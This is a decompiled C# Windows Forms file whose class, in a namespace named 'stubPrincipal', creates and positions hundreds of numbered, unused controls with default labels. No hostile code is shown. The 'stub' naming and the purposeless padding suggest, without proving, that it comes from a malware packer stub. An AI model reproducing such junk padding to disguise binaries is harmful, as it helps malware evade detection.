using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My;

namespace stubPrincipal
{
	// Token: 0x0200000C RID: 12
	[DesignerGenerated]
	public class FormulaMagicaDaPaz : Form
	{
		// Token: 0x06000434 RID: 1076 RVA: 0x00014BEE File Offset: 0x00012DEE
		public FormulaMagicaDaPaz()
		{
			base.Load += this.Form1_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x00014C10 File Offset: 0x00012E10
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x00014C50 File Offset: 0x00012E50
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.Button1 = new Button();
			this.CheckedListBox1 = new CheckedListBox();
			this.CheckBox1 = new CheckBox();
			this.ListBox1 = new ListBox();
			this.LinkLabel1 = new LinkLabel();
			this.MonthCalendar1 = new MonthCalendar();
			this.ProgressBar1 = new ProgressBar();
			this.LinkLabel2 = new LinkLabel();
			this.NotifyIcon1 = new NotifyIcon(this.components);
			this.MonthCalendar2 = new MonthCalendar();
			this.MonthCalendar3 = new MonthCalendar();
			this.ComboBox1 = new ComboBox();
			this.CheckedListBox2 = new CheckedListBox();
			this.Button2 = new Button();
			this.ComboBox2 = new ComboBox();
			this.CheckBox2 = new CheckBox();
			this.LinkLabel3 = new LinkLabel();
			this.RadioButton1 = new RadioButton();
			this.ProgressBar2 = new ProgressBar();
			this.NumericUpDown1 = new NumericUpDown();
			this.PictureBox1 = new PictureBox();
			this.ToolTip1 = new ToolTip(this.components);
			this.TreeView1 = new TreeView();
			this.WebBrowser1 = new WebBrowser();
			this.MaskedTextBox1 = new MaskedTextBox();
			this.PictureBox2 = new PictureBox();
			this.RadioButton2 = new RadioButton();
			this.MaskedTextBox2 = new MaskedTextBox();
			this.Label1 = new Label();
			this.ListBox2 = new ListBox();
			this.DateTimePicker1 = new DateTimePicker();
			this.ListBox3 = new ListBox();
			this.CheckedListBox3 = new CheckedListBox();
			this.DateTimePicker2 = new DateTimePicker();
			this.ProgressBar3 = new ProgressBar();
			this.ProgressBar4 = new ProgressBar();
			this.ProgressBar5 = new ProgressBar();
			this.ProgressBar6 = new ProgressBar();
			this.DateTimePicker3 = new DateTimePicker();
			this.CheckedListBox4 = new CheckedListBox();
			this.ListBox4 = new ListBox();
			this.DateTimePicker4 = new DateTimePicker();
			this.ListBox5 = new ListBox();
			this.Label2 = new Label();
			this.MaskedTextBox3 = new MaskedTextBox();
			this.RadioButton3 = new RadioButton();
			this.PictureBox3 = new PictureBox();
			this.MaskedTextBox4 = new MaskedTextBox();
			this.WebBrowser2 = new WebBrowser();
			this.TreeView2 = new TreeView();
			this.PictureBox4 = new PictureBox();
			this.NumericUpDown2 = new NumericUpDown();
			this.ProgressBar7 = new ProgressBar();
			this.RadioButton4 = new RadioButton();
			this.LinkLabel4 = new LinkLabel();
			this.CheckBox3 = new CheckBox();
			this.ComboBox3 = new ComboBox();
			this.Button3 = new Button();
			this.CheckedListBox5 = new CheckedListBox();
			this.ComboBox4 = new ComboBox();
			this.MonthCalendar4 = new MonthCalendar();
			this.MonthCalendar5 = new MonthCalendar();
			this.LinkLabel5 = new LinkLabel();
			this.ProgressBar8 = new ProgressBar();
			this.LinkLabel6 = new LinkLabel();
			this.ListBox6 = new ListBox();
			this.CheckBox4 = new CheckBox();
			this.CheckedListBox6 = new CheckedListBox();
			this.Button4 = new Button();
			this.ProgressBar9 = new ProgressBar();
			this.ProgressBar10 = new ProgressBar();
			this.DateTimePicker5 = new DateTimePicker();
			this.CheckedListBox7 = new CheckedListBox();
			this.ListBox7 = new ListBox();
			this.DateTimePicker6 = new DateTimePicker();
			this.ListBox8 = new ListBox();
			this.Label3 = new Label();
			this.MaskedTextBox5 = new MaskedTextBox();
			this.RadioButton5 = new RadioButton();
			this.PictureBox5 = new PictureBox();
			this.MaskedTextBox6 = new MaskedTextBox();
			this.WebBrowser3 = new WebBrowser();
			this.TreeView3 = new TreeView();
			this.PictureBox6 = new PictureBox();
			this.NumericUpDown3 = new NumericUpDown();
			this.ProgressBar11 = new ProgressBar();
			this.RadioButton6 = new RadioButton();
			this.LinkLabel7 = new LinkLabel();
			this.CheckBox5 = new CheckBox();
			this.ComboBox5 = new ComboBox();
			this.Button5 = new Button();
			this.CheckedListBox8 = new CheckedListBox();
			this.ComboBox6 = new ComboBox();
			this.MonthCalendar6 = new MonthCalendar();
			this.MonthCalendar7 = new MonthCalendar();
			this.LinkLabel8 = new LinkLabel();
			this.ProgressBar12 = new ProgressBar();
			this.LinkLabel9 = new LinkLabel();
			this.ListBox9 = new ListBox();
			this.CheckBox6 = new CheckBox();
			this.CheckedListBox9 = new CheckedListBox();
			this.Button6 = new Button();
			this.ProgressBar13 = new ProgressBar();
			this.ProgressBar14 = new ProgressBar();
			this.DateTimePicker7 = new DateTimePicker();
			this.CheckedListBox10 = new CheckedListBox();
			this.ListBox10 = new ListBox();
			this.DateTimePicker8 = new DateTimePicker();
			this.ListBox11 = new ListBox();
			this.Label4 = new Label();
			this.MaskedTextBox7 = new MaskedTextBox();
			this.RadioButton7 = new RadioButton();
			this.PictureBox7 = new PictureBox();
			this.MaskedTextBox8 = new MaskedTextBox();
			this.WebBrowser4 = new WebBrowser();
			this.TreeView4 = new TreeView();
			this.PictureBox8 = new PictureBox();
			this.NumericUpDown4 = new NumericUpDown();
			this.ProgressBar15 = new ProgressBar();
			this.RadioButton8 = new RadioButton();
			this.LinkLabel10 = new LinkLabel();
			this.CheckBox7 = new CheckBox();
			this.ComboBox7 = new ComboBox();
			this.Button7 = new Button();
			this.CheckedListBox11 = new CheckedListBox();
			this.ComboBox8 = new ComboBox();
			this.MonthCalendar8 = new MonthCalendar();
			this.MonthCalendar9 = new MonthCalendar();
			this.LinkLabel11 = new LinkLabel();
			this.ProgressBar16 = new ProgressBar();
			this.LinkLabel12 = new LinkLabel();
			this.ListBox12 = new ListBox();
			this.CheckBox8 = new CheckBox();
			this.CheckedListBox12 = new CheckedListBox();
			this.Button8 = new Button();
			this.ProgressBar17 = new ProgressBar();
			this.ProgressBar18 = new ProgressBar();
			this.DateTimePicker9 = new DateTimePicker();
			this.CheckedListBox13 = new CheckedListBox();
			this.ListBox13 = new ListBox();
			this.DateTimePicker10 = new DateTimePicker();
			this.ListBox14 = new ListBox();
			this.Label5 = new Label();
			this.MaskedTextBox9 = new MaskedTextBox();
			this.RadioButton9 = new RadioButton();
			this.PictureBox9 = new PictureBox();
			this.MaskedTextBox10 = new MaskedTextBox();
			this.WebBrowser5 = new WebBrowser();
			this.TreeView5 = new TreeView();
			this.PictureBox10 = new PictureBox();
			this.NumericUpDown5 = new NumericUpDown();
			this.ProgressBar19 = new ProgressBar();
			this.RadioButton10 = new RadioButton();
			this.LinkLabel13 = new LinkLabel();
			this.CheckBox9 = new CheckBox();
			this.ComboBox9 = new ComboBox();
			this.Button9 = new Button();
			this.CheckedListBox14 = new CheckedListBox();
			this.ComboBox10 = new ComboBox();
			this.MonthCalendar10 = new MonthCalendar();
			this.MonthCalendar11 = new MonthCalendar();
			this.LinkLabel14 = new LinkLabel();
			this.ProgressBar20 = new ProgressBar();
			this.LinkLabel15 = new LinkLabel();
			this.ListBox15 = new ListBox();
			this.CheckBox10 = new CheckBox();
			this.CheckedListBox15 = new CheckedListBox();
			this.Button10 = new Button();
			this.ProgressBar21 = new ProgressBar();
			this.ProgressBar22 = new ProgressBar();
			this.DateTimePicker11 = new DateTimePicker();
			this.CheckedListBox16 = new CheckedListBox();
			this.ListBox16 = new ListBox();
			this.DateTimePicker12 = new DateTimePicker();
			this.ListBox17 = new ListBox();
			this.Label6 = new Label();
			this.MaskedTextBox11 = new MaskedTextBox();
			this.RadioButton11 = new RadioButton();
			this.PictureBox11 = new PictureBox();
			this.MaskedTextBox12 = new MaskedTextBox();
			this.WebBrowser6 = new WebBrowser();
			this.TreeView6 = new TreeView();
			this.PictureBox12 = new PictureBox();
			this.NumericUpDown6 = new NumericUpDown();
			this.ProgressBar23 = new ProgressBar();
			this.RadioButton12 = new RadioButton();
			this.LinkLabel16 = new LinkLabel();
			this.CheckBox11 = new CheckBox();
			this.ComboBox11 = new ComboBox();
			this.Button11 = new Button();
			this.CheckedListBox17 = new CheckedListBox();
			this.ComboBox12 = new ComboBox();
			this.MonthCalendar12 = new MonthCalendar();
			this.MonthCalendar13 = new MonthCalendar();
			this.LinkLabel17 = new LinkLabel();
			this.ProgressBar24 = new ProgressBar();
			this.LinkLabel18 = new LinkLabel();
			this.ListBox18 = new ListBox();
			this.CheckBox12 = new CheckBox();
			this.CheckedListBox18 = new CheckedListBox();
			this.Button12 = new Button();
			this.ProgressBar25 = new ProgressBar();
			this.ProgressBar26 = new ProgressBar();
			this.DateTimePicker13 = new DateTimePicker();
			this.CheckedListBox19 = new CheckedListBox();
			this.ListBox19 = new ListBox();
			this.DateTimePicker14 = new DateTimePicker();
			this.ListBox20 = new ListBox();
			this.Label7 = new Label();
			this.MaskedTextBox13 = new MaskedTextBox();
			this.RadioButton13 = new RadioButton();
			this.PictureBox13 = new PictureBox();
			this.MaskedTextBox14 = new MaskedTextBox();
			this.WebBrowser7 = new WebBrowser();
			this.TreeView7 = new TreeView();
			this.PictureBox14 = new PictureBox();
			this.NumericUpDown7 = new NumericUpDown();
			this.ProgressBar27 = new ProgressBar();
			this.RadioButton14 = new RadioButton();
			this.LinkLabel19 = new LinkLabel();
			this.CheckBox13 = new CheckBox();
			this.ComboBox13 = new ComboBox();
			this.Button13 = new Button();
			this.CheckedListBox20 = new CheckedListBox();
			this.ComboBox14 = new ComboBox();
			this.MonthCalendar14 = new MonthCalendar();
			this.MonthCalendar15 = new MonthCalendar();
			this.LinkLabel20 = new LinkLabel();
			this.ProgressBar28 = new ProgressBar();
			this.LinkLabel21 = new LinkLabel();
			this.ListBox21 = new ListBox();
			this.CheckBox14 = new CheckBox();
			this.CheckedListBox21 = new CheckedListBox();
			this.Button14 = new Button();
			this.ProgressBar29 = new ProgressBar();
			this.ProgressBar30 = new ProgressBar();
			this.DateTimePicker15 = new DateTimePicker();
			this.CheckedListBox22 = new CheckedListBox();
			this.ListBox22 = new ListBox();
			this.DateTimePicker16 = new DateTimePicker();
			this.ListBox23 = new ListBox();
			this.Label8 = new Label();
			this.MaskedTextBox15 = new MaskedTextBox();
			this.RadioButton15 = new RadioButton();
			this.PictureBox15 = new PictureBox();
			this.MaskedTextBox16 = new MaskedTextBox();
			this.WebBrowser8 = new WebBrowser();
			this.TreeView8 = new TreeView();
			this.PictureBox16 = new PictureBox();
			this.NumericUpDown8 = new NumericUpDown();
			this.ProgressBar31 = new ProgressBar();
			this.RadioButton16 = new RadioButton();
			this.LinkLabel22 = new LinkLabel();
			this.CheckBox15 = new CheckBox();
			this.ComboBox15 = new ComboBox();
			this.Button15 = new Button();
			this.CheckedListBox23 = new CheckedListBox();
			this.ComboBox16 = new ComboBox();
			this.MonthCalendar16 = new MonthCalendar();
			this.MonthCalendar17 = new MonthCalendar();
			this.LinkLabel23 = new LinkLabel();
			this.ProgressBar32 = new ProgressBar();
			this.LinkLabel24 = new LinkLabel();
			this.ListBox24 = new ListBox();
			this.CheckBox16 = new CheckBox();
			this.CheckedListBox24 = new CheckedListBox();
			this.Button16 = new Button();
			this.ProgressBar33 = new ProgressBar();
			this.ProgressBar34 = new ProgressBar();
			this.DateTimePicker17 = new DateTimePicker();
			this.CheckedListBox25 = new CheckedListBox();
			this.ListBox25 = new ListBox();
			this.DateTimePicker18 = new DateTimePicker();
			this.ListBox26 = new ListBox();
			this.Label9 = new Label();
			this.MaskedTextBox17 = new MaskedTextBox();
			this.RadioButton17 = new RadioButton();
			this.PictureBox17 = new PictureBox();
			this.MaskedTextBox18 = new MaskedTextBox();
			this.WebBrowser9 = new WebBrowser();
			this.TreeView9 = new TreeView();
			this.PictureBox18 = new PictureBox();
			this.NumericUpDown9 = new NumericUpDown();
			this.ProgressBar35 = new ProgressBar();
			this.RadioButton18 = new RadioButton();
			this.LinkLabel25 = new LinkLabel();
			this.CheckBox17 = new CheckBox();
			this.ComboBox17 = new ComboBox();
			this.Button17 = new Button();
			this.CheckedListBox26 = new CheckedListBox();
			this.ComboBox18 = new ComboBox();
			this.MonthCalendar18 = new MonthCalendar();
			this.MonthCalendar19 = new MonthCalendar();
			this.LinkLabel26 = new LinkLabel();
			this.ProgressBar36 = new ProgressBar();
			this.LinkLabel27 = new LinkLabel();
			this.ListBox27 = new ListBox();
			this.CheckBox18 = new CheckBox();
			this.CheckedListBox27 = new CheckedListBox();
			this.Button18 = new Button();
			this.ProgressBar37 = new ProgressBar();
			this.ProgressBar38 = new ProgressBar();
			this.DateTimePicker19 = new DateTimePicker();
			this.CheckedListBox28 = new CheckedListBox();
			this.ListBox28 = new ListBox();
			this.DateTimePicker20 = new DateTimePicker();
			this.ListBox29 = new ListBox();
			this.Label10 = new Label();
			this.MaskedTextBox19 = new MaskedTextBox();
			this.RadioButton19 = new RadioButton();
			this.PictureBox19 = new PictureBox();
			this.MaskedTextBox20 = new MaskedTextBox();
			this.WebBrowser10 = new WebBrowser();
			this.TreeView10 = new TreeView();
			this.PictureBox20 = new PictureBox();
			this.NumericUpDown10 = new NumericUpDown();
			this.ProgressBar39 = new ProgressBar();
			this.RadioButton20 = new RadioButton();
			this.LinkLabel28 = new LinkLabel();
			this.CheckBox19 = new CheckBox();
			this.ComboBox19 = new ComboBox();
			this.Button19 = new Button();
			this.CheckedListBox29 = new CheckedListBox();
			this.ComboBox20 = new ComboBox();
			this.MonthCalendar20 = new MonthCalendar();
			this.MonthCalendar21 = new MonthCalendar();
			this.LinkLabel29 = new LinkLabel();
			this.ProgressBar40 = new ProgressBar();
			this.LinkLabel30 = new LinkLabel();
			this.ListBox30 = new ListBox();
			this.CheckBox20 = new CheckBox();
			this.CheckedListBox30 = new CheckedListBox();
			this.Button20 = new Button();
			this.ProgressBar41 = new ProgressBar();
			this.ProgressBar42 = new ProgressBar();
			this.DateTimePicker21 = new DateTimePicker();
			this.CheckedListBox31 = new CheckedListBox();
			this.ListBox31 = new ListBox();
			this.DateTimePicker22 = new DateTimePicker();
			this.ListBox32 = new ListBox();
			this.Label11 = new Label();
			this.MaskedTextBox21 = new MaskedTextBox();
			this.RadioButton21 = new RadioButton();
			this.PictureBox21 = new PictureBox();
			this.MaskedTextBox22 = new MaskedTextBox();
			this.WebBrowser11 = new WebBrowser();
			this.TreeView11 = new TreeView();
			this.PictureBox22 = new PictureBox();
			this.NumericUpDown11 = new NumericUpDown();
			this.ProgressBar43 = new ProgressBar();
			this.RadioButton22 = new RadioButton();
			this.LinkLabel31 = new LinkLabel();
			this.CheckBox21 = new CheckBox();
			this.ComboBox21 = new ComboBox();
			this.Button21 = new Button();
			this.ToolTip2 = new ToolTip(this.components);
			this.NotifyIcon2 = new NotifyIcon(this.components);
			this.CheckedListBox32 = new CheckedListBox();
			this.ComboBox22 = new ComboBox();
			this.MonthCalendar22 = new MonthCalendar();
			this.MonthCalendar23 = new MonthCalendar();
			this.LinkLabel32 = new LinkLabel();
			this.ProgressBar44 = new ProgressBar();
			this.LinkLabel33 = new LinkLabel();
			this.ListBox33 = new ListBox();
			this.CheckBox22 = new CheckBox();
			this.CheckedListBox33 = new CheckedListBox();
			this.Button22 = new Button();
			this.ProgressBar45 = new ProgressBar();
			this.ProgressBar46 = new ProgressBar();
			this.DateTimePicker23 = new DateTimePicker();
			this.CheckedListBox34 = new CheckedListBox();
			this.ListBox34 = new ListBox();
			this.DateTimePicker24 = new DateTimePicker();
			this.ListBox35 = new ListBox();
			this.Label12 = new Label();
			this.MaskedTextBox23 = new MaskedTextBox();
			this.RadioButton23 = new RadioButton();
			this.PictureBox23 = new PictureBox();
			this.MaskedTextBox24 = new MaskedTextBox();
			this.WebBrowser12 = new WebBrowser();
			this.TreeView12 = new TreeView();
			this.PictureBox24 = new PictureBox();
			this.NumericUpDown12 = new NumericUpDown();
			this.ProgressBar47 = new ProgressBar();
			this.RadioButton24 = new RadioButton();
			this.LinkLabel34 = new LinkLabel();
			this.CheckBox23 = new CheckBox();
			this.ComboBox23 = new ComboBox();
			this.Button23 = new Button();
			this.CheckedListBox35 = new CheckedListBox();
			this.ComboBox24 = new ComboBox();
			this.MonthCalendar24 = new MonthCalendar();
			this.MonthCalendar25 = new MonthCalendar();
			this.LinkLabel35 = new LinkLabel();
			this.ProgressBar48 = new ProgressBar();
			this.MonthCalendar26 = new MonthCalendar();
			this.LinkLabel36 = new LinkLabel();
			this.ListBox36 = new ListBox();
			this.CheckBox24 = new CheckBox();
			this.CheckedListBox36 = new CheckedListBox();
			this.Button24 = new Button();
			this.ProgressBar49 = new ProgressBar();
			this.ProgressBar50 = new ProgressBar();
			this.DateTimePicker25 = new DateTimePicker();
			this.CheckedListBox37 = new CheckedListBox();
			this.ListBox37 = new ListBox();
			this.DateTimePicker26 = new DateTimePicker();
			this.ListBox38 = new ListBox();
			this.Label13 = new Label();
			this.MaskedTextBox25 = new MaskedTextBox();
			this.RadioButton25 = new RadioButton();
			this.PictureBox25 = new PictureBox();
			this.MaskedTextBox26 = new MaskedTextBox();
			this.WebBrowser13 = new WebBrowser();
			this.TreeView13 = new TreeView();
			this.PictureBox26 = new PictureBox();
			this.NumericUpDown13 = new NumericUpDown();
			this.ProgressBar51 = new ProgressBar();
			this.RadioButton26 = new RadioButton();
			this.LinkLabel37 = new LinkLabel();
			this.CheckBox25 = new CheckBox();
			this.ComboBox25 = new ComboBox();
			this.Button25 = new Button();
			this.CheckedListBox38 = new CheckedListBox();
			this.ComboBox26 = new ComboBox();
			this.MonthCalendar27 = new MonthCalendar();
			this.MonthCalendar28 = new MonthCalendar();
			this.LinkLabel38 = new LinkLabel();
			this.ProgressBar52 = new ProgressBar();
			this.LinkLabel39 = new LinkLabel();
			this.ListBox39 = new ListBox();
			this.CheckBox26 = new CheckBox();
			this.CheckedListBox39 = new CheckedListBox();
			this.Button26 = new Button();
			this.ProgressBar53 = new ProgressBar();
			this.ProgressBar54 = new ProgressBar();
			this.DateTimePicker27 = new DateTimePicker();
			this.CheckedListBox40 = new CheckedListBox();
			this.ListBox40 = new ListBox();
			this.DateTimePicker28 = new DateTimePicker();
			this.ListBox41 = new ListBox();
			this.Label14 = new Label();
			this.MaskedTextBox27 = new MaskedTextBox();
			this.RadioButton27 = new RadioButton();
			this.PictureBox27 = new PictureBox();
			this.MaskedTextBox28 = new MaskedTextBox();
			this.WebBrowser14 = new WebBrowser();
			this.TreeView14 = new TreeView();
			this.PictureBox28 = new PictureBox();
			this.NumericUpDown14 = new NumericUpDown();
			this.ProgressBar55 = new ProgressBar();
			this.RadioButton28 = new RadioButton();
			this.LinkLabel40 = new LinkLabel();
			this.CheckBox27 = new CheckBox();
			this.ComboBox27 = new ComboBox();
			this.Button27 = new Button();
			this.CheckedListBox41 = new CheckedListBox();
			this.ComboBox28 = new ComboBox();
			this.MonthCalendar29 = new MonthCalendar();
			this.MonthCalendar30 = new MonthCalendar();
			this.LinkLabel41 = new LinkLabel();
			this.ProgressBar56 = new ProgressBar();
			this.LinkLabel42 = new LinkLabel();
			this.ListBox42 = new ListBox();
			this.CheckBox28 = new CheckBox();
			this.CheckedListBox42 = new CheckedListBox();
			this.Button28 = new Button();
			this.ProgressBar57 = new ProgressBar();
			this.ProgressBar58 = new ProgressBar();
			this.DateTimePicker29 = new DateTimePicker();
			this.CheckedListBox43 = new CheckedListBox();
			this.ListBox43 = new ListBox();
			this.DateTimePicker30 = new DateTimePicker();
			this.ListBox44 = new ListBox();
			this.Label15 = new Label();
			this.MaskedTextBox29 = new MaskedTextBox();
			this.RadioButton29 = new RadioButton();
			this.PictureBox29 = new PictureBox();
			this.MaskedTextBox30 = new MaskedTextBox();
			this.WebBrowser15 = new WebBrowser();
			this.TreeView15 = new TreeView();
			this.PictureBox30 = new PictureBox();
			this.NumericUpDown15 = new NumericUpDown();
			this.ProgressBar59 = new ProgressBar();
			this.RadioButton30 = new RadioButton();
			this.LinkLabel43 = new LinkLabel();
			this.CheckBox29 = new CheckBox();
			this.ComboBox29 = new ComboBox();
			this.Button29 = new Button();
			this.CheckedListBox44 = new CheckedListBox();
			this.ComboBox30 = new ComboBox();
			this.MonthCalendar31 = new MonthCalendar();
			this.MonthCalendar32 = new MonthCalendar();
			this.LinkLabel44 = new LinkLabel();
			this.ProgressBar60 = new ProgressBar();
			this.LinkLabel45 = new LinkLabel();
			this.ListBox45 = new ListBox();
			this.CheckBox30 = new CheckBox();
			this.CheckedListBox45 = new CheckedListBox();
			this.Button30 = new Button();
			this.ProgressBar61 = new ProgressBar();
			this.ProgressBar62 = new ProgressBar();
			this.DateTimePicker31 = new DateTimePicker();
			this.CheckedListBox46 = new CheckedListBox();
			this.ListBox46 = new ListBox();
			this.DateTimePicker32 = new DateTimePicker();
			this.ListBox47 = new ListBox();
			this.Label16 = new Label();
			this.MaskedTextBox31 = new MaskedTextBox();
			this.RadioButton31 = new RadioButton();
			this.PictureBox31 = new PictureBox();
			this.MaskedTextBox32 = new MaskedTextBox();
			this.WebBrowser16 = new WebBrowser();
			this.TreeView16 = new TreeView();
			this.PictureBox32 = new PictureBox();
			this.NumericUpDown16 = new NumericUpDown();
			this.ProgressBar63 = new ProgressBar();
			this.RadioButton32 = new RadioButton();
			this.LinkLabel46 = new LinkLabel();
			this.CheckBox31 = new CheckBox();
			this.ComboBox31 = new ComboBox();
			this.Button31 = new Button();
			this.CheckedListBox47 = new CheckedListBox();
			this.ComboBox32 = new ComboBox();
			this.MonthCalendar33 = new MonthCalendar();
			this.MonthCalendar34 = new MonthCalendar();
			this.LinkLabel47 = new LinkLabel();
			this.ProgressBar64 = new ProgressBar();
			this.LinkLabel48 = new LinkLabel();
			this.ListBox48 = new ListBox();
			this.CheckBox32 = new CheckBox();
			this.CheckedListBox48 = new CheckedListBox();
			this.Button32 = new Button();
			this.ProgressBar65 = new ProgressBar();
			this.ProgressBar66 = new ProgressBar();
			this.DateTimePicker33 = new DateTimePicker();
			this.CheckedListBox49 = new CheckedListBox();
			this.ListBox49 = new ListBox();
			this.DateTimePicker34 = new DateTimePicker();
			this.ListBox50 = new ListBox();
			this.Label17 = new Label();
			this.MaskedTextBox33 = new MaskedTextBox();
			this.RadioButton33 = new RadioButton();
			this.PictureBox33 = new PictureBox();
			this.MaskedTextBox34 = new MaskedTextBox();
			this.WebBrowser17 = new WebBrowser();
			this.TreeView17 = new TreeView();
			this.PictureBox34 = new PictureBox();
			this.NumericUpDown17 = new NumericUpDown();
			this.ProgressBar67 = new ProgressBar();
			this.RadioButton34 = new RadioButton();
			this.LinkLabel49 = new LinkLabel();
			this.CheckBox33 = new CheckBox();
			this.ComboBox33 = new ComboBox();
			this.Button33 = new Button();
			this.ToolTip3 = new ToolTip(this.components);
			this.NotifyIcon3 = new NotifyIcon(this.components);
			this.CheckedListBox50 = new CheckedListBox();
			this.ComboBox34 = new ComboBox();
			this.MonthCalendar35 = new MonthCalendar();
			this.MonthCalendar36 = new MonthCalendar();
			this.LinkLabel50 = new LinkLabel();
			this.ProgressBar68 = new ProgressBar();
			this.LinkLabel51 = new LinkLabel();
			this.ListBox51 = new ListBox();
			this.CheckBox34 = new CheckBox();
			this.CheckedListBox51 = new CheckedListBox();
			this.Button34 = new Button();
			this.ProgressBar69 = new ProgressBar();
			this.ProgressBar70 = new ProgressBar();
			this.DateTimePicker35 = new DateTimePicker();
			this.CheckedListBox52 = new CheckedListBox();
			this.ListBox52 = new ListBox();
			this.DateTimePicker36 = new DateTimePicker();
			this.ListBox53 = new ListBox();
			this.Label18 = new Label();
			this.MaskedTextBox35 = new MaskedTextBox();
			this.RadioButton35 = new RadioButton();
			this.PictureBox35 = new PictureBox();
			this.MaskedTextBox36 = new MaskedTextBox();
			this.WebBrowser18 = new WebBrowser();
			this.TreeView18 = new TreeView();
			this.PictureBox36 = new PictureBox();
			this.NumericUpDown18 = new NumericUpDown();
			this.ProgressBar71 = new ProgressBar();
			this.RadioButton36 = new RadioButton();
			this.LinkLabel52 = new LinkLabel();
			this.CheckBox35 = new CheckBox();
			this.ComboBox35 = new ComboBox();
			this.Button35 = new Button();
			this.CheckedListBox53 = new CheckedListBox();
			this.ComboBox36 = new ComboBox();
			this.MonthCalendar37 = new MonthCalendar();
			this.MonthCalendar38 = new MonthCalendar();
			this.LinkLabel53 = new LinkLabel();
			this.ProgressBar72 = new ProgressBar();
			this.MonthCalendar39 = new MonthCalendar();
			this.LinkLabel54 = new LinkLabel();
			this.ListBox54 = new ListBox();
			this.CheckBox36 = new CheckBox();
			this.CheckedListBox54 = new CheckedListBox();
			this.Button36 = new Button();
			((ISupportInitialize)this.NumericUpDown1).BeginInit();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			((ISupportInitialize)this.PictureBox3).BeginInit();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			((ISupportInitialize)this.NumericUpDown2).BeginInit();
			((ISupportInitialize)this.PictureBox5).BeginInit();
			((ISupportInitialize)this.PictureBox6).BeginInit();
			((ISupportInitialize)this.NumericUpDown3).BeginInit();
			((ISupportInitialize)this.PictureBox7).BeginInit();
			((ISupportInitialize)this.PictureBox8).BeginInit();
			((ISupportInitialize)this.NumericUpDown4).BeginInit();
			((ISupportInitialize)this.PictureBox9).BeginInit();
			((ISupportInitialize)this.PictureBox10).BeginInit();
			((ISupportInitialize)this.NumericUpDown5).BeginInit();
			((ISupportInitialize)this.PictureBox11).BeginInit();
			((ISupportInitialize)this.PictureBox12).BeginInit();
			((ISupportInitialize)this.NumericUpDown6).BeginInit();
			((ISupportInitialize)this.PictureBox13).BeginInit();
			((ISupportInitialize)this.PictureBox14).BeginInit();
			((ISupportInitialize)this.NumericUpDown7).BeginInit();
			((ISupportInitialize)this.PictureBox15).BeginInit();
			((ISupportInitialize)this.PictureBox16).BeginInit();
			((ISupportInitialize)this.NumericUpDown8).BeginInit();
			((ISupportInitialize)this.PictureBox17).BeginInit();
			((ISupportInitialize)this.PictureBox18).BeginInit();
			((ISupportInitialize)this.NumericUpDown9).BeginInit();
			((ISupportInitialize)this.PictureBox19).BeginInit();
			((ISupportInitialize)this.PictureBox20).BeginInit();
			((ISupportInitialize)this.NumericUpDown10).BeginInit();
			((ISupportInitialize)this.PictureBox21).BeginInit();
			((ISupportInitialize)this.PictureBox22).BeginInit();
			((ISupportInitialize)this.NumericUpDown11).BeginInit();
			((ISupportInitialize)this.PictureBox23).BeginInit();
			((ISupportInitialize)this.PictureBox24).BeginInit();
			((ISupportInitialize)this.NumericUpDown12).BeginInit();
			((ISupportInitialize)this.PictureBox25).BeginInit();
			((ISupportInitialize)this.PictureBox26).BeginInit();
			((ISupportInitialize)this.NumericUpDown13).BeginInit();
			((ISupportInitialize)this.PictureBox27).BeginInit();
			((ISupportInitialize)this.PictureBox28).BeginInit();
			((ISupportInitialize)this.NumericUpDown14).BeginInit();
			((ISupportInitialize)this.PictureBox29).BeginInit();
			((ISupportInitialize)this.PictureBox30).BeginInit();
			((ISupportInitialize)this.NumericUpDown15).BeginInit();
			((ISupportInitialize)this.PictureBox31).BeginInit();
			((ISupportInitialize)this.PictureBox32).BeginInit();
			((ISupportInitialize)this.NumericUpDown16).BeginInit();
			((ISupportInitialize)this.PictureBox33).BeginInit();
			((ISupportInitialize)this.PictureBox34).BeginInit();
			((ISupportInitialize)this.NumericUpDown17).BeginInit();
			((ISupportInitialize)this.PictureBox35).BeginInit();
			((ISupportInitialize)this.PictureBox36).BeginInit();
			((ISupportInitialize)this.NumericUpDown18).BeginInit();
			base.SuspendLayout();
			this.Button1.Location = new Point(242, 125);
			this.Button1.Name = "Button1";
			this.Button1.Size = new Size(156, 50);
			this.Button1.TabIndex = 0;
			this.Button1.Text = "Button1";
			this.Button1.UseVisualStyleBackColor = true;
			this.CheckedListBox1.FormattingEnabled = true;
			this.CheckedListBox1.Location = new Point(324, 80);
			this.CheckedListBox1.Name = "CheckedListBox1";
			this.CheckedListBox1.Size = new Size(303, 49);
			this.CheckedListBox1.TabIndex = 1;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Location = new Point(163, 245);
			this.CheckBox1.Name = "CheckBox1";
			this.CheckBox1.Size = new Size(81, 17);
			this.CheckBox1.TabIndex = 2;
			this.CheckBox1.Text = "CheckBox1";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.ListBox1.FormattingEnabled = true;
			this.ListBox1.Location = new Point(273, 276);
			this.ListBox1.Name = "ListBox1";
			this.ListBox1.Size = new Size(165, 69);
			this.ListBox1.TabIndex = 3;
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.Location = new Point(466, 211);
			this.LinkLabel1.Name = "LinkLabel1";
			this.LinkLabel1.Size = new Size(59, 13);
			this.LinkLabel1.TabIndex = 4;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "LinkLabel1";
			this.MonthCalendar1.Location = new Point(63, 352);
			this.MonthCalendar1.Name = "MonthCalendar1";
			this.MonthCalendar1.TabIndex = 5;
			this.ProgressBar1.Location = new Point(86, 125);
			this.ProgressBar1.Name = "ProgressBar1";
			this.ProgressBar1.Size = new Size(93, 107);
			this.ProgressBar1.TabIndex = 6;
